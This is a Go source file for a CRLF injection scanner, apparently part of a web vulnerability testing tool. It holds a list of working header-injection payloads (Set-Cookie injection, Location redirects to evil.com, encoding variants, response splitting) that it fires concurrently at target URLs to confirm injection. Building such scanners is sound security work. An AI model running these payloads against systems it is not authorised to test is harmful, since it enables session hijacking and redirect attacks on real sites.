package scanner

import (
	"bugx/pkg/utils"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

type CRLFScanner struct{}

// generateCRLFToken creates a unique token for verification
func generateCRLFToken() string {
	bytes := make([]byte, 6)
	rand.Read(bytes)
	return "bugx" + hex.EncodeToString(bytes)
}

// CRLF injection payloads with TOKEN placeholder
var crlfPayloads = []string{
	// Basic CRLF - Set-Cookie injection
	"%0d%0aSet-Cookie:TOKEN=injected",
	"%0d%0aSet-Cookie: TOKEN=injected",
	"%0aSet-Cookie:TOKEN=injected",
	"%0dSet-Cookie:TOKEN=injected",

	// Double encoding
	"%250d%250aSet-Cookie:TOKEN=injected",
	"%25%30%64%25%30%61Set-Cookie:TOKEN=injected",

	// Unicode variants
	"%E5%98%8D%E5%98%8ASet-Cookie:TOKEN=injected",
	"%u000d%u000aSet-Cookie:TOKEN=injected",

	// Location header injection (Open Redirect via CRLF)
	"%0d%0aLocation:https://evil.com",
	"%0d%0aLocation: https://TOKEN.evil.com",

	// X-Header injection
	"%0d%0aX-Injected:TOKEN",
	"%0d%0aX-TOKEN:injected",

	// Content-Type injection
	"%0d%0aContent-Type:text/html",

	// Full response injection
	"%0d%0a%0d%0a<html>TOKEN</html>",
	"%0d%0aContent-Length:35%0d%0aX-Injected:header%0d%0a%0d%0aTOKEN",

	// Tab and other variants
	"%0d%09Set-Cookie:TOKEN=injected",
	"%%0d0aSet-Cookie:TOKEN=injected",
	"%0d%0a%20Set-Cookie:TOKEN=injected",

	// Null byte variants
	"%00%0d%0aSet-Cookie:TOKEN=injected",

	// Path variants
	"/%0d%0aSet-Cookie:TOKEN=injected",
	"//%0d%0aSet-Cookie:TOKEN=injected",
}

func (s *CRLFScanner) Scan(config ScanConfig) []ScanResult {
	var processor ResultProcessor
	var wg sync.WaitGroup
	sem := make(chan struct{}, config.Threads)

	fmt.Println(utils.Yellow("\n[i] Starting CRLF Scan (CRLFuzz-style verification)..."))
	fmt.Println(utils.White("[*] Checking for injected headers in HTTP response"))
	fmt.Println(utils.White("[*] Only CONFIRMED header injections will be reported\n"))

	for _, baseURL := range config.URLs {
		// Use built-in payloads + user payloads
		payloadsToTest := crlfPayloads
		if len(config.Payloads) > 0 {
			payloadsToTest = append(payloadsToTest, config.Payloads...)
		}

		for _, payload := range payloadsToTest {
			wg.Add(1)
			sem <- struct{}{}
			go func(baseURL, payload string) {
				defer wg.Done()
				defer func() { <-sem }()

				// Generate unique token
				token := generateCRLFToken()
				testPayload := strings.ReplaceAll(payload, "TOKEN", token)
				targetURL := baseURL + testPayload

				// Make request and check headers
				confirmed, details := verifyCRLFInjection(targetURL, token, config.Cookie, config.Timeout)

				if confirmed {
					fmt.Printf("%s %s\n",
						utils.Red("[✓] CRLF CONFIRMED:"),
						utils.Cyan(truncateURL(targetURL, 90)))
					fmt.Printf("    → %s\n", utils.White(details))

					processor.Add(ScanResult{
						URL:        targetURL,
						Vulnerable: true,
						Payload:    testPayload,
						Details:    details,
					})
				}

			}(baseURL, payload)
		}
	}

	wg.Wait()
	printCRLFSummary(processor.Results)
	return processor.Results
}

// verifyCRLFInjection checks if headers were successfully injected
func verifyCRLFInjection(targetURL, token, cookie string, timeout int) (bool, string) {
	client := &http.Client{
		Timeout: time.Duration(timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false, ""
	}
	req.Header.Set("User-Agent", utils.GetRandomUserAgent())
	if cookie != "" {
		req.Header.Set("Cookie", cookie)
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()

	// Check for injected headers
	injectionTypes := []string{}

	// 1. Check Set-Cookie header injection
	for _, cookieHeader := range resp.Header.Values("Set-Cookie") {
		if strings.Contains(cookieHeader, token) || strings.Contains(cookieHeader, "injected") {
			injectionTypes = append(injectionTypes, fmt.Sprintf("Set-Cookie injection: %s", cookieHeader))
		}
	}

	// 2. Check X-Injected header
	if xInjected := resp.Header.Get("X-Injected"); xInjected != "" {
		if strings.Contains(xInjected, token) {
			injectionTypes = append(injectionTypes, fmt.Sprintf("X-Injected header: %s", xInjected))
		}
	}

	// 3. Check for any header containing our token
	for name, values := range resp.Header {
		for _, value := range values {
			if strings.Contains(strings.ToLower(name), token) || strings.Contains(value, token) {
				injectionTypes = append(injectionTypes, fmt.Sprintf("Header %s: %s", name, value))
			}
		}
	}

	// 4. Check for Location header injection (CRLF to Open Redirect)
	location := resp.Header.Get("Location")
	if location != "" && (strings.Contains(location, "evil.com") || strings.Contains(location, token)) {
		injectionTypes = append(injectionTypes, fmt.Sprintf("Location header injection: %s", location))
	}

	// 5. Check response body for injected content
	bodyBytes := make([]byte, 1024*10)
	n, _ := resp.Body.Read(bodyBytes)
	body := string(bodyBytes[:n])

	// Check if token appears in body in HTML context (response injection)
	if strings.Contains(body, "<html>"+token) || strings.Contains(body, token) {
		// Make sure it's not just reflected normally
		if strings.Contains(body, fmt.Sprintf("<html>%s</html>", token)) {
			injectionTypes = append(injectionTypes, "Response body injection detected")
		}
	}

	if len(injectionTypes) > 0 {
		return true, strings.Join(injectionTypes, " | ")
	}

	return false, ""
}

func printCRLFSummary(results []ScanResult) {
	setCookie, location, other := 0, 0, 0
	for _, r := range results {
		if strings.Contains(r.Details, "Set-Cookie") {
			setCookie++
		} else if strings.Contains(r.Details, "Location") {
			location++
		} else {
			other++
		}
	}

	fmt.Println(utils.Yellow("\n--------------------------------------------------"))
	fmt.Println(utils.White("CRLF Scan Summary:"))
	fmt.Printf("  %s Set-Cookie injection: %d\n", utils.Red("●"), setCookie)
	fmt.Printf("  %s Location header injection: %d\n", utils.Red("●"), location)
	fmt.Printf("  %s Other header injection: %d\n", utils.Red("●"), other)
	fmt.Printf("  %s Total CONFIRMED: %d\n", utils.Green("★"), len(results))
	fmt.Println(utils.Yellow("--------------------------------------------------"))

	if len(results) > 0 {
		fmt.Println(utils.Green("\n[!] All findings are VERIFIED - injected headers confirmed in response!"))
	} else {
		fmt.Println(utils.Yellow("\n[i] No confirmed CRLF injection vulnerabilities found."))
	}
}
